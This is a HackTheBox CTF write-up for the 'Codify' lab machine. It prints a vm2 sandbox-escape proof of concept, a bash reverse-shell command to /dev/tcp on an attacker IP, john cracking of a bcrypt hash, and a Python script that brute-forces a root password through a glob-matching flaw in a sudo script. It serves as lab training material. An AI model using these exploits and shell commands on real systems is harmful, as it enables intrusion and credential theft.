---
layout: post
title: Codify - HackTheBox
categories:
- Writeups
- Hackthebox
- Machine
tags:
- Linux
- vm2
- nodejs
- sandboxing
- javascript
- bash script vulnerability
- john
- mariadb
---

## Recon

We have detected three ports open upon scanning all the ports in the machine.

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp   open  http?
3000/tcp open  ppp?
```

Upon browsing we are redirected to codify.htb, so we add the domain in our hosts file and start analyzing the web app.
It seems like a web application that lets developers or users in general to run javascript, in particular node.js code using a sandboxing environment  with the name of vm2(This information is present in the [about page](http://codify.htb/about)). The version used by the challenge developers is the version 3.9.16 of [vm2](https://github.com/patriksimek/vm2/releases/tag/3.9.16).  

The challenge has some limitations. 
We can't use the following modules:
- child_process
- fs

The modules that we can use(whitelist):
- url
- crypto
- util
- events
- assert
- stream
- path
- os
- zlib

However, they mention that their "ticketing system is being migrated". Lets run a vhost scan.
We tried using gobuster but we were getting status code 301 for all the domains in the wordlist:
`gobuster vhost -u http://codify.htb -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`

So we tried ffuf filtering for the response words but we didnt get anything:
`~/go/bin/ffuf -H "Host: FUZZ.codify.htb" -c -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://codify.htb -fw 20`

## Foothold

Since the version of vm2 is from April it might has vulnerabilities. In fact we found two vulnerabilities that lets us escape the sandbox and run commands on the target machine,  CVE-2023-29199 and CVE-2023-30547. Searching in the github for pocs in both versions, we found a poc that works: https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c.

```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`

console.log(vm.run(code));
```

Using the following code we get `uid=1001(svc) gid=1001(svc) groups=1001(svc)`.
Lets try to get a shell! 

echo "bash -i >& /dev/tcp/10.10.14.70/1234 0>&1" > rev_cenas.sh || chmod +x rev_cenas.sh || bash ./rev_cenas.sh


python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg (ENTER) (ENTER)


find / -path /proc -prun -user svc 2>/dev/null

Upon running find we get a interesting file: `/var/www/contact/tickets.db`
It seems like a database lets get the file into our computer and analyze it.
The database has one user: `joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`
John indicates that the hash is using the algorithm bcrypt [Blowfish 32/64 X3], `john hash --wordlist=~/rockyou.txt`.

```shell
$ john hash --wordlist=~/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (joshua)
1g 0:00:00:17 DONE (2023-11-05 15:39) 0.05688g/s 77.81p/s 77.81c/s 77.81C/s winston..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

The password of the user joshua is `spongebob1`. 
Since we have a user with the name of `joshua` in the system, lets try to get a shell with the password we found.

```shell
$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```

## Privileges Escalation

The first thing we do is to look at the output of the command `sudo -l`.

```shell
$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh

```

We can run the script as root, but at first it seems that we can't do nothing.
The script:

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'

```

After some time, we notice that the script has a vulnerability that lets you exfiltrate each character of the `.creds` file.
The condition `if [[ $DB_PASS == $USER_PASS ]]; then` uses the operator `==`. It lets us know the first character of `$DB_PASS` by brute forcing with `<character>*`. It will compare the first character of `$DB_PASS` with the character we put in the input. Once we found the first character we move on to the next character and so on. For more information about the `==` operator look at the [link](https://tldp.org/LDP/abs/html/comparison-ops.html).

There are two ways of getting the root credentials: 
1. Exfiltrate each character 

```python
import string
import subprocess

all_characters_and_numbers = list(string.ascii_letters + string.digits)

password = ""
found = False

while not found:
    for character in all_characters_and_numbers:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```


2. Use pspy to get the stdout when we hit the first character

Open two shells, one running `pspy` with the flag `-f` and the other running the script `sudo /opt/scripts/mysql-backup.sh`.
Use `k*` as the input and look at the pspy logs. The following log will uncover the password: `/usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;` which is `kljh12k3jhaskjh12kjh3`.

Using the password after executing `su -` we get a shell as root.